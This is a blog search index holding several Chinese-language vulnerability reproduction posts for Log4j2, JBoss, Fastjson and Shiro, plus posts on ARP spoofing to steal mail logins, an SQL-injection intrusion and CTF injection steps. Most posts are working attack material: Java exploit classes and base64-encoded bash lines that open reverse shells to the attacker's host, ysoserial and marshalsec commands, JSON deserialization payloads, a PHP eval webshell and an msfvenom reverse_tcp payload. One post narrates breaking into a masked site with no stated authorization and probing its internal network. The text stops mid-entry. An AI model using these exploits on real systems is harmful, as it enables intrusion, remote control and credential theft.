<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Apache Log4j2漏洞复现</title>
      <link href="2021/12/21/apache-log4j2-lou-dong-fu-xian/"/>
      <url>2021/12/21/apache-log4j2-lou-dong-fu-xian/</url>
      
        <content type="html"><![CDATA[<h1 id="redis简介"><a href="#redis简介" class="headerlink" title="redis简介"></a>redis简介</h1><h1 id="Apache-Log4j2漏洞复现"><a href="#Apache-Log4j2漏洞复现" class="headerlink" title="Apache Log4j2漏洞复现"></a>Apache Log4j2漏洞复现</h1><h2 id="复现（反弹shell）"><a href="#复现（反弹shell）" class="headerlink" title="复现（反弹shell）"></a>复现（反弹shell）</h2><p>借用掌控安全的靶机</p><p>地址：<a href="http://d63bb2586.lab.aqlab.cn/">http://d63bb2586.lab.aqlab.cn/</a></p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20220315150430.png"></p><p>先试下dnslog</p><p>payload：${jndi:rmi://rf5cj8.dnslog.cn/a}</p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20220315150731.png"></p><p>首先编写一个恶意java恶意类（包含反弹shell的系统命令），然后编译生成字节码传到我们的服务器上面</p><p>如下代码，并保存为Exploit.java</p><pre class="line-numbers language-none"><code class="language-none">public class Exploit {    public Exploit(){        try{            // 要执行的命令            String[] commands = {"bash","-c","exec 5&lt;&gt;/dev/tcp/远程服务器ip/12345;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done"};            Process pc = Runtime.getRuntime().exec(commands);            pc.waitFor();        } catch(Exception e){            e.printStackTrace();        }    }    public static void main(String[] argv) {        Exploit e = new Exploit();    }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>编译命令</p><pre class="line-numbers language-none"><code class="language-none">javac Exploit.java<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>我这边使用的是python3开启一个简单的HTTP服务器</p><pre class="line-numbers language-none"><code class="language-none">python3 -m http.server 8080<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后将生成Exploit.class文件，放到我们服务器的根目录下面</p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20220315151455.png"></p><p>然后我们在服务器上利用工具（marshalsec），开启一个RMI或者LDAP服务器，并指定加载的资源为我们服务器上的class恶意字节码文件</p><pre class="line-numbers language-none"><code class="language-none">#开启LDAP服务器，并绑定到1234端口java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://远程服务器IP:8080/#Exploit" 1234  #开启RMI服务器，并绑定到1234端口java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://远程服务器IP:8080/#Exploit" 1234 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20220315152812.png"></p><p>成功开启ldap服务器，监听着1234端口</p><p>然后我们只需要在存在漏洞的网站处插入payload即可</p><pre class="line-numbers language-none"><code class="language-none">${jndi:ldap://搭建RMI或LDAP的服务器地址/xx}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>Tips:xx可任意填写</p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20220315153252.png"></p><p>服务器成功收到shell</p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20220315152700.png"></p>]]></content>
      
      
      <categories>
          
          <category> 复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> log4j2 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JBoss 5.x/6.x 反序列化漏洞（CVE-2017-12149）</title>
      <link href="2021/11/13/jboss-5.x6.x-fan-xu-lie-hua-lou-dong-cve-2017-12149/"/>
      <url>2021/11/13/jboss-5.x6.x-fan-xu-lie-hua-lou-dong-cve-2017-12149/</url>
      
        <content type="html"><![CDATA[<h1 id="JBoss-5-x-6-x-反序列化漏洞（CVE-2017-12149）"><a href="#JBoss-5-x-6-x-反序列化漏洞（CVE-2017-12149）" class="headerlink" title="JBoss 5.x/6.x 反序列化漏洞（CVE-2017-12149）"></a>JBoss 5.x/6.x 反序列化漏洞（CVE-2017-12149）</h1><h2 id="复现（反弹shell）"><a href="#复现（反弹shell）" class="headerlink" title="复现（反弹shell）"></a>复现（反弹shell）</h2><p>主页如下</p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20220316150921.png"></p><p>直接访问页面<a href="http://192.168.60.134:8080/invoker/readonly">http://192.168.60.134:8080/invoker/readonly</a></p><p>发现报错信息</p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20220316155049.png"></p><p>编码反弹bash命令</p><pre class="line-numbers language-none"><code class="language-none">#原始bash -i &gt;&amp; /dev/tcp/192.168.60.134/3030 0&gt;&amp;1#我的bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjYwLjEzNC8zMDMwIDA+JjE=}|{base64,-d}|{bash,-i}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后使用ysoserial工具生成序列化数据</p><pre class="line-numbers language-none"><code class="language-none">java -jar ysoserial.jar CommonsCollections5 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjYwLjEzNC8zMDMwIDA+JjE=}|{base64,-d}|{bash,-i}" &gt; poc.ser<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="C:\Users\Polaris\AppData\Roaming\Typora\typora-user-images\image-20220316160231739.png" alt="image-20220316160231739"></p><p>到这里不要忘记在我们服务器上监听3030端口哟</p><p>最后一步，收工</p><pre class="line-numbers language-none"><code class="language-none">curl http://192.168.60.134:8080/invoker/readonly --data-binary @poc.ser<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20220316160453.png"></p>]]></content>
      
      
      <categories>
          
          <category> 复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> jboss </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JBoss 4.x JBossMQ JMS 反序列化漏洞（CVE-2017-7504）</title>
      <link href="2021/11/11/jboss-4.x-jbossmq-jms-fan-xu-lie-hua-lou-dong-cve-2017-7504/"/>
      <url>2021/11/11/jboss-4.x-jbossmq-jms-fan-xu-lie-hua-lou-dong-cve-2017-7504/</url>
      
        <content type="html"><![CDATA[<h1 id="JBoss-4-x-JBossMQ-JMS-反序列化漏洞（CVE-2017-7504）"><a href="#JBoss-4-x-JBossMQ-JMS-反序列化漏洞（CVE-2017-7504）" class="headerlink" title="JBoss 4.x JBossMQ JMS 反序列化漏洞（CVE-2017-7504）"></a>JBoss 4.x JBossMQ JMS 反序列化漏洞（CVE-2017-7504）</h1><h2 id="复现（反弹shell）"><a href="#复现（反弹shell）" class="headerlink" title="复现（反弹shell）"></a>复现（反弹shell）</h2><p>打开主页如下所示</p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20220316153155.png"></p><p>将反弹bash命令加密</p><pre class="line-numbers language-none"><code class="language-none">#原始bash -i &gt;&amp; /dev/tcp/192.168.60.134/3030 0&gt;&amp;1#加密bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjYwLjEzNC8zMDMwIDA+JjE=}|{base64,-d}|{bash,-i}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>然后放入下方的命令中，使用工具ysoserial，来生成反序列化数据</p><pre class="line-numbers language-none"><code class="language-none">java -jar ysoserial.jar CommonsCollections5 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjYwLjEzNC8zMDMwIDA+JjE=}|{base64,-d}|{bash,-i}" &gt; 1.ser<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>先在我们的服务器监听3030端口</p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20220316152229.png"></p><p>命令行键入</p><pre class="line-numbers language-none"><code class="language-none">curl http://192.168.60.134:8080/jbossmq-httpil/HTTPServerILServlet --data-binary @1.ser<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20220316154134.png"></p><p>成功反弹shell</p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20220316153956.png"></p>]]></content>
      
      
      <categories>
          
          <category> 复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> jboss </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Fastjson 1.2.47 远程命令执行漏洞</title>
      <link href="2021/10/11/fastjson-1.2.47-yuan-cheng-ming-ling-zhi-xing-lou-dong/"/>
      <url>2021/10/11/fastjson-1.2.47-yuan-cheng-ming-ling-zhi-xing-lou-dong/</url>
      
        <content type="html"><![CDATA[<h1 id="redis简介"><a href="#redis简介" class="headerlink" title="redis简介"></a>redis简介</h1><h1 id="Fastjson-1-2-47-远程命令执行漏洞"><a href="#Fastjson-1-2-47-远程命令执行漏洞" class="headerlink" title="Fastjson 1.2.47 远程命令执行漏洞"></a>Fastjson 1.2.47 远程命令执行漏洞</h1><h2 id="复现（反弹shell）"><a href="#复现（反弹shell）" class="headerlink" title="复现（反弹shell）"></a>复现（反弹shell）</h2><p>使用vulhub的靶场复现</p><p>打开页面，就发现返回了json字符串</p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20220315104224.png"></p><p>然后在本地写一个Exploit.java的文件</p><p>代码如下</p><pre class="line-numbers language-none"><code class="language-none">import javax.naming.Context;import javax.naming.Name;import javax.naming.spi.ObjectFactory;import java.io.IOException;import java.util.Hashtable;  public class Exploit{    public Exploit() {}     static    {        try {            String[] cmds = System.getProperty("os.name").toLowerCase().contains("win")                    ? new String[]{"cmd.exe","/c", "calc.exe"}                    : new String[]{"bash", "-c", "/bin/bash -i &gt;&amp; /dev/tcp/远程服务器ip/5252 0&gt;&amp;1"};            Runtime.getRuntime().exec(cmds);        } catch (Exception e) {            e.printStackTrace();        }    }     public static void main(String[] args) {        Exploit e = new Exploit();        System.out.println("hello world");    }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后编译成字节码，传到咱们的服务器根目录中（需要开启web服务）</p><p>我使用python3开启一个简单的服务器</p><pre class="line-numbers language-none"><code class="language-none">python3 -m http.server 8080<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用工具marshalsec，启动一个RMI（远程方法调用）或者LDAP（轻量级目录访问协议）服务器，监听9999端口，指定加载远程类Exploit.class</p><pre class="line-numbers language-none"><code class="language-none">#RMIjava -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://远程服务器ip/#Exploit 9999#LDAPjava -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://远程服务器ip/#Exploit 9999<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后还得在我们反弹到的远程服务器中使用nc监听下5252端口</p><pre class="line-numbers language-none"><code class="language-none">nv -lvp 5252<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>bp抓包post发送payload</p><pre class="line-numbers language-none"><code class="language-none"># rmi{"name":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"lysec":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://RMI服务器IP:9999/Exploit","autoCommit":true}}# ldap{"name":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"lysec":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://LDAP服务器:9999/Exploit","autoCommit":true}}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20220315143925.png"></p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20220315143844.png"></p>]]></content>
      
      
      <categories>
          
          <category> 复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fastjson </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>arp欺骗</title>
      <link href="2021/10/11/arp-qi-pian/"/>
      <url>2021/10/11/arp-qi-pian/</url>
      
        <content type="html"><![CDATA[<h3 id="ARP欺骗"><a href="#ARP欺骗" class="headerlink" title="ARP欺骗"></a>ARP欺骗</h3><h4 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h4><blockquote><p><strong>Kali充当中间人，捕获用户在Win7上使用Foxmail时收发邮件的数据包，并窃取登录名和授权码</strong></p></blockquote><h4 id="组网"><a href="#组网" class="headerlink" title="组网"></a>组网</h4><blockquote><p>组建局域网（<strong>NAT</strong>模式下）</p></blockquote><ul><li><p><strong>VM_Kali</strong>（充当中间人）</p><blockquote><p><strong>IP</strong>：192.168.140.129</p><p><strong>MAC</strong>：00:0C:29:FB:07:11</p></blockquote></li><li><p><strong>VM_Win7</strong></p><blockquote><p><strong>IP</strong>：192.168.140.144</p><p><strong>MAC</strong>：00:0C:29:D6:6D:1B</p></blockquote></li><li><p><strong>真实机</strong></p><blockquote><p><strong>IP</strong>：192.168.140.1</p><p><strong>MAC</strong>：00:50:56:C0:00:08</p></blockquote></li></ul><h4 id="在Win7上安装foxmail"><a href="#在Win7上安装foxmail" class="headerlink" title="在Win7上安装foxmail"></a>在Win7上安装foxmail</h4><blockquote><p><strong>1.这里我使用163邮箱，根据帮助填写用户名及授权码↓</strong></p></blockquote><p><img src="https://github.com/southerose/PictureBed/raw/master/img/image-20210118213635299.png" alt="img"></p><blockquote><p><strong>2.然后在账号里面把ssl前面的勾关了，因为要抓明文账号以及密码↓</strong></p></blockquote><p><img src="https://github.com/southerose/PictureBed/raw/master/img/image-20210118214023576.png" alt="img"></p><h4 id="安装netwox"><a href="#安装netwox" class="headerlink" title="安装netwox"></a>安装netwox</h4><pre class="line-numbers language-none"><code class="language-none">#kali下apt-get install netwox<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="伪造身份"><a href="#伪造身份" class="headerlink" title="伪造身份"></a>伪造身份</h4><pre class="line-numbers language-none"><code class="language-none">Step1:# kali伪造成Win7以欺骗网关sudo netwox 33 -d eth0 -a {mac-kali} -b {mac-网关} -e 2 -f {mac-kali} -g {ip-win7} -h {mac-网关}  -i {ip-网关}sudo netwox 33 -d eth0 -a 00:0C:29:FB:07:11 -b 00:50:56:C0:00:08 -e 2 -f 00:0C:29:FB:07:11 -g 192.168.140.144 -h 00:50:56:C0:00:08  -i 192.168.140.1Step2:# kali伪造成网关以欺骗Win7netwox 33 -d eth0 -a {mac-kali} -b {mac-win7}  -e 2 -f {mac-kali}  -g {ip-网关} -h {mac-win7} -i {ip-win7}netwox 33 -d eth0 -a 00:0C:29:FB:07:11 -b 00:0C:29:D6:6D:1B -e 2 -f 00:0C:29:FB:07:11  -g 192.168.140.1 -h 00:0C:29:D6:6D:1B -i 192.168.140.144<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://github.com/southerose/PictureBed/raw/master/img/image-20210119171736819.png" alt="img"></p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/image-20210119171708680.png" alt="img"></p><ul><li>这时Kali充当一个中间人</li></ul><h4 id="Wireshark抓取流量"><a href="#Wireshark抓取流量" class="headerlink" title="Wireshark抓取流量"></a>Wireshark抓取流量</h4><blockquote><p>1.在Kali里开始捕获eth0的流量↓</p></blockquote><p><img src="https://github.com/southerose/PictureBed/raw/master/img/image-20210119163926313.png" alt="img"></p><blockquote><p>2.在foxmail里面点击收取↓</p></blockquote><p><img src="https://github.com/southerose/PictureBed/raw/master/img/image-20210119171642070.png" alt="img"></p><blockquote><p>3.返回wireshark，只查看imap的包，发现账号和密码↓</p></blockquote><p><img src="https://github.com/southerose/PictureBed/raw/master/img/image-20210119164816923.png" alt="img"></p><h4 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h4><ul><li>详见<a href="https://github.com/Ajatars/-">内网渗透开源仓库</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 其他 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> arp欺骗 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>shiro权限绕过_CVE-2020-1957</title>
      <link href="2021/09/20/shiro-quan-xian-rao-guo-cve-2020-1957/"/>
      <url>2021/09/20/shiro-quan-xian-rao-guo-cve-2020-1957/</url>
      
        <content type="html"><![CDATA[<h1 id="0X00-漏洞简介"><a href="#0X00-漏洞简介" class="headerlink" title="0X00 漏洞简介"></a>0X00 漏洞简介</h1><p>Apache Shiro是一个强大且易用的Java安全框架,执行身份验证、授权、密码和会话管理。</p><p> 漏洞原因主要是Spring web在匹配url时没有匹配上/导致绕过。</p><h1 id="0X01-影响范围"><a href="#0X01-影响范围" class="headerlink" title="0X01 影响范围"></a>0X01 影响范围</h1><p>Apache Shiro &lt; 1.5.3</p><h1 id="0x-02-漏洞复现"><a href="#0x-02-漏洞复现" class="headerlink" title="0x 02 漏洞复现"></a>0x 02 漏洞复现</h1><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20211117151854.png" alt="img"></p><p>主页抓包，将请求路径改为/admin，发现被重定向</p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20211117151958.png" alt="img"></p><p>请求路径</p><pre class="line-numbers language-none"><code class="language-none">/x/..;/admin/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>权限绕过成功，进入主页</p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20211117154649.png" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> 复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> shiro漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>shiro550_CVE-2016-4437</title>
      <link href="2021/09/20/shiro550-cve-2016-4437/"/>
      <url>2021/09/20/shiro550-cve-2016-4437/</url>
      
        <content type="html"><![CDATA[<h1 id="0X01-漏洞描述"><a href="#0X01-漏洞描述" class="headerlink" title="0X01 漏洞描述"></a>0X01 漏洞描述</h1><p>Apache Shiro是一个强大且易用的Java安全框架,执行身份验证、授权、密码和会话管理。</p><p>rememberMe的AES加密泄露可影响任意版本的shiro，造成反序列化漏洞。</p><h1 id="0X02-漏洞原理"><a href="#0X02-漏洞原理" class="headerlink" title="0X02 漏洞原理"></a>0X02 漏洞原理</h1><p>Apache Shiro框架在cookie中有一个字段，提供记住我（rememberMe）的功能，也就是关闭了浏览器以后再打开，不需要在登陆。</p><p>shiro对rememberMe的加密过程：</p><ul><li>获取rememberMe cookie</li><li>序列化</li><li>AES加密</li><li>Base64编码操作</li></ul><p>shiro在识别身份时对rememberMe的解密密过程：</p><ul><li>获取rememberMe cookie</li><li>Base64解码操作</li><li>AES解密（加密密钥硬编码）</li><li>反序列化（没有过滤）</li></ul><p>但是，AES加密的密钥Key被硬编码在代码里，意味着每个人通过源代码都能拿到AES加密的密钥。因此，攻击者构造一个恶意的对象，并且对其序列化，AES加密，base64编码后，作为cookie的rememberMe字段发送。Shiro将rememberMe进行解密并且反序列化，最终造成反序列化漏洞。</p><h1 id="0X03-漏洞复现"><a href="#0X03-漏洞复现" class="headerlink" title="0X03 漏洞复现"></a>0X03 漏洞复现</h1><h2 id="漏洞验证过程"><a href="#漏洞验证过程" class="headerlink" title="漏洞验证过程"></a>漏洞验证过程</h2><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20211115094732.png"></p><p>打开主页发现出现remember me，抓包重放发现返回包中出现<code>rememberMe=deleteMe</code></p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20211115095502.png"></p><p><a href="https://github.com/insightglacier/Shiro_exploit%EF%BC%8C%E4%BD%BF%E7%94%A8%E8%AF%A5poc%E8%BF%9B%E8%A1%8C%E6%A3%80%E6%B5%8B">https://github.com/insightglacier/Shiro_exploit，使用该poc进行检测</a></p><pre class="line-numbers language-none"><code class="language-none">python3 shiro_exploit.py -t 3 -u http://192.168.60.134:8080<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20211115163825.png"></p><p>存在漏洞，即可进行进一步利用。</p><h2 id="漏洞利用过程"><a href="#漏洞利用过程" class="headerlink" title="漏洞利用过程"></a>漏洞利用过程</h2><h3 id="1-反弹shell"><a href="#1-反弹shell" class="headerlink" title="1.反弹shell"></a>1.反弹shell</h3><p><a href="https://github.com/feihong-cs/ShiroExploit-Deprecated">https://github.com/feihong-cs/ShiroExploit-Deprecated</a></p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20211115191557.png"></p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20211115191645.png"></p><p>输入目标地址，开始检测漏洞。</p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20211115191727.png"></p><p>攻击机监听</p><pre class="line-numbers language-none"><code class="language-none">nc -lvp 1234<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20211115191936.png"></p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20211115191852.png"></p><p>收到反弹的shell</p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20211115192005.png"></p><h3 id="2-命令执行"><a href="#2-命令执行" class="headerlink" title="2.命令执行"></a>2.命令执行</h3><p><a href="https://github.com/j1anFen/shiro_attack">https://github.com/j1anFen/shiro_attack</a></p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20211115192545.png"></p><p>命令执行</p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20211115192618.png"></p>]]></content>
      
      
      <categories>
          
          <category> 复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> shiro漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记一次渗透测试</title>
      <link href="2021/09/11/ji-yi-ci-shen-tou-ce-shi/"/>
      <url>2021/09/11/ji-yi-ci-shen-tou-ce-shi/</url>
      
        <content type="html"><![CDATA[<h1 id="实战-记一次渗透测试"><a href="#实战-记一次渗透测试" class="headerlink" title="实战|记一次渗透测试"></a>实战|记一次渗透测试</h1><h2 id="注入点探测"><a href="#注入点探测" class="headerlink" title="注入点探测"></a>注入点探测</h2><p>站点：<a href="http://xxx.cn/?id=1">http://xxx.cn/?id=1</a></p><p>简单测试发现存在注入</p><pre class="line-numbers language-none"><code class="language-none">?id=1 and 1=1--?id=1 and 1=2--<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>sqlmap尝试</p><pre class="line-numbers language-none"><code class="language-none">sqlmap -u "http://xxx.xx/" --batch --random-agent<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20211111105332.png"></p><p>发现存在三种类型的注入。</p><h2 id="getshell思路"><a href="#getshell思路" class="headerlink" title="getshell思路"></a>getshell思路</h2><p>到这里就有几种getshell的思路了。</p><ol><li>借助sql注入跑出数据库中的信息，比如后台登陆账号以及密码等，进入后台后再寻找其他漏洞getshell。</li><li>使用sqlmap自带命令–os-shell，配合cs的power上线getshell（经过页面报错信息，确认目标为win）</li><li>手工注入，借助select xx info outfile写入一句话木马，getshell</li></ol><p>经过一番探测，该网站竟然没有后台。遂转sqlmap跑下，结果也无法–os-shell。所以后面getshell的方式，采用第三种方法。</p><h2 id="手工注入"><a href="#手工注入" class="headerlink" title="手工注入"></a>手工注入</h2><p>通过sql语句写入一句话木马到网站目录下，我们现在先探测一下网站是什么用户，换句话说是否有足够的权限使得我们能够写文件。</p><p>sqlmap -u “<a href="http://xxx.xx/?id=1&quot;">http://xxx.xx/?id=1"</a> –batch –random-agent –is-dba</p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20211111105631.png"></p><p>是管理用户。</p><p>然后还得探测一下是否有绝对路径，参数值后方输入一个单引号就发现报出了绝对路径。</p><pre class="line-numbers language-none"><code class="language-none">http://xxx.xx/?id=1'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20211111111158.png"></p><p>知道了绝对路径，尝试构造payload语句写入一句话木马到网站根目录。（本次采用堆叠注入）</p><pre class="line-numbers language-none"><code class="language-none">http://xxx.xx/?id=1;select "&lt;?php eval($_REQUEST[1]);?&gt;" into outfile 'C:\\phpStudy\\www\\outfile.php'#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20211111111401.png"></p><p>访问<a href="http://xxx.xx/outfile.php%EF%BC%8C%E5%BA%94%E8%AF%A5%E6%98%AF%E5%86%99%E5%85%A5%E6%88%90%E5%8A%9F%E4%BA%86%E3%80%82">http://xxx.xx/outfile.php，应该是写入成功了。</a></p><h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>webshell管理器添加数据</p><p><a href="http://xxx.xx/outfile.php%EF%BC%8C%E5%AF%86%E7%A0%81%E4%B8%BA1">http://xxx.xx/outfile.php，密码为1</a></p><p>蚁剑连接成功。</p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20211111111518.png"></p><p>但是上去<code>whoami</code>执行后发现又是test用户权限，就非常迷。（猜测可能之前sqlmap探测出来是dba，只是说那个用户有写的权限，不一定是管理用户）</p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20211113102802.png"></p><h2 id="上线msf进行提权尝试"><a href="#上线msf进行提权尝试" class="headerlink" title="上线msf进行提权尝试"></a>上线msf进行提权尝试</h2><p>然后使用msf上线的方式获得一个meterpreter</p><p>1.上传msf木马（这里使用的反弹的方式，msf我部署在vps上的）</p><pre class="line-numbers language-none"><code class="language-none">msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=xx.xx.xx.xx lport=6543 -f exe &gt; 01.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>2.msf监听6543端口</p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20211113155830.png"></p><p>注意生成木马的payload要与监听的payload一致。</p><p>上传01.exe到蚁剑上执行。</p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20211113155642.png"></p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20211113160009.png"></p><p>然后拿到一个meterpreter。</p><h2 id="内网探测"><a href="#内网探测" class="headerlink" title="内网探测"></a>内网探测</h2><p>查看端口发现开放了3389端口，尝试一番破解密码与提权操作之后均以失败告终。遂搭建socks代理，瞅瞅内网有没有东西</p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20211113160902.png"></p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20211113165441.png"></p><p>探测出了几台内网主机。传统功夫点到为止。</p>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql注入 </tag>
            
            <tag> 内网渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一些CTF题目</title>
      <link href="2021/08/21/yi-xie-ctf-ti-mu/"/>
      <url>2021/08/21/yi-xie-ctf-ti-mu/</url>
      
        <content type="html"><![CDATA[<h1 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h1><h2 id="injection"><a href="#injection" class="headerlink" title="injection"></a>injection</h2><p>主页是这个样子</p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210509163956.png"></p><blockquote><p>判断注入类型    数字型</p></blockquote> <pre class="line-numbers language-none"><code class="language-none">id=1 and 1=1#id=1 and 1=2#<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><blockquote><p>判断列数    两列</p></blockquote><pre class="line-numbers language-none"><code class="language-none">id=1 order by 2#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>查询是否有显示位    union联合查询注入    2号位</p></blockquote><pre class="line-numbers language-none"><code class="language-none">id=1 union select 1,2#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>查询数据库    ctfhub、informaion_schema</p></blockquote><pre class="line-numbers language-none"><code class="language-none">id=1 union select 1,(select concat(schema_name) from information_schema.schemata limit 0,1)#id=1 union select 1,(select concat(schema_name) from information_schema.schemata limit 1,1)#<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><blockquote><p>查询表（ctfhub）    flag、info、</p></blockquote><pre class="line-numbers language-none"><code class="language-none">id=1 union select 1,(select concat(table_name) from information_schema.tables where table_schema='ctfhub' limit 0,1)#id=1 union select 1,(select concat(table_name) from information_schema.tables where table_schema='ctfhub' limit 1,1)#<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><blockquote><p>查询字段（flag）    flag</p></blockquote><pre class="line-numbers language-none"><code class="language-none">id=1 union select 1,(select concat(column_name) from information_schema.columns where table_name='flag' limit 0,1)#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>dump数据</p></blockquote><pre class="line-numbers language-none"><code class="language-none">id=1 union select 1,(select flag from flag)#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210509165134.png"></p><h2 id="sql注入-1"><a 